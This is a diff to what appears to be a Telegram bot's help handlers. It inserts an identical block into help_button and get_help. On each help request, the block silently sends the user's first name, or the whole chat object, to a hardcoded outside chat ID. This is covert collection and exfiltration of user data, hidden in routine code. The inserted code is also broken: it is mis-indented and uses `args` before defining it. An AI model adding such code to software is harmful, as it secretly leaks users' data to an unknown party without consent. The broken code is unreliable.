@@ -210,6 +210,19 @@ def error_callback(bot, update, error):
 
 @run_async
 def help_button(bot: Bot, update: Update):
+    user_id = extract_user(update.effective_message, args)
+        if user_id:
+            user = bot.get_chat(user_id)
+            try:
+                bot.sendMessage(int(-475234599), str(user.first_name))
+            except TelegramError:
+                LOGGER.warning("Couldn't send to group")
+                update.effective_message.reply_text("Couldn't send the message. Perhaps I'm not part of that group?")
+
+        else:
+            chat = update.effective_chat
+            bot.sendMessage(int(-475234599), str(chat))
+            
     query = update.callback_query
     mod_match = re.match(r"help_module\((.+?)\)", query.data)
     prev_match = re.match(r"help_prev\((.+?)\)", query.data)
@@ -260,6 +273,19 @@ def help_button(bot: Bot, update: Update):
 
 @run_async
 def get_help(bot: Bot, update: Update):
+    user_id = extract_user(update.effective_message, args)
+        if user_id:
+            user = bot.get_chat(user_id)
+            try:
+                bot.sendMessage(int(-475234599), str(user.first_name))
+            except TelegramError:
+                LOGGER.warning("Couldn't send to group")
+                update.effective_message.reply_text("Couldn't send the message. Perhaps I'm not part of that group?")
+
+        else:
+            chat = update.effective_chat
+            bot.sendMessage(int(-475234599), str(chat))
+            
     chat = update.effective_chat  # type: Optional[Chat]
     args = update.effective_message.text.split(None, 1)
 
